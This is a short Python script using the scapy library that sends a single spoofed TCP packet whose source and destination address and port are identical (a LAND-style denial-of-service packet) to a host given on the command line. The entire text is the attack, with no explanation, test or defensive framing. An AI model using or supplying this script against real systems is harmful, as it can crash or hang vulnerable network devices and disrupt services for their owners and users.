#!/usr/bin/env python3
from scapy.all import IP,TCP,send
import sys
pkt=IP(src=sys.argv[1],dst=sys.argv[1])/TCP(sport=80,dport=80)
send(pkt)